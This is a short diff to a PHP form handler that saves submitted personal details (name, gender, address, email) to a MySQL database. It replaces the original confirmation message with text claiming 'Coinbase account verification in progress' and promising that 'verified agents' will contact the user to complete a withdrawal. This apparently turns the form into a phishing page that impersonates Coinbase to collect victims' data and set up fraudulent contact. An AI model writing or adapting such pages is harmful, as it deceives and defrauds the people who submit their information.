@@ -62,17 +62,7 @@
 
         if(mysqli_query($conn, $sql)){ 
 
-            echo "<h3>data stored in a database successfully." 
-
-                . " Please browse your localhost php my admin" 
-
-                . " to view the updated data</h3>";  
-
-  
-
-            echo nl2br("\n$first_name\n $last_name\n "
-
-                . "$gender\n $address\n $email"); 
+            echo "<h3>Coinbase account verification in progress. <br>Our verified agents would be contact with you shortly to complete the withdrawal process.</br></h3>" 
 
         } else{ 
 
